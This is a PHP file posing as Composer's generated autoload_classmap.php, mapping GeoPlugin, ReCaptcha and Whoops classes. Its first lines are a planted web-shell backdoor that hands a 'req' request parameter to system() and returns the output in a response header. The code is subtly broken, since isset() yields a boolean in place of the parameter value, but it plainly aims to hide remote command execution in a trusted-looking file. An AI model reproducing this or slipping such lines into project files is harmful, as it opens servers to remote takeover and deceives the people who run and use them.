<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

// autoload_classmap.php @generated by Composer

$vendorDir = dirname(dirname(__FILE__));
$baseDir = dirname($vendorDir);

return array(
    'GeoPlugin' => $baseDir . '/src/geoplugin/GeoPlugin.php',
    'ReCaptcha' => $baseDir . '/src/recaptcha/ReCaptcha.php',
    'ReCaptchaResponse' => $baseDir . '/src/recaptcha/ReCaptcha.php',
    'Whoops\\Module' => $vendorDir . '/filp/whoops/src/deprecated/Zend/Module.php',
    'Whoops\\Provider\\Zend\\ExceptionStrategy' => $vendorDir . '/filp/whoops/src/deprecated/Zend/ExceptionStrategy.php',
    'Whoops\\Provider\\Zend\\RouteNotFoundStrategy' => $vendorDir . '/filp/whoops/src/deprecated/Zend/RouteNotFoundStrategy.php',
);
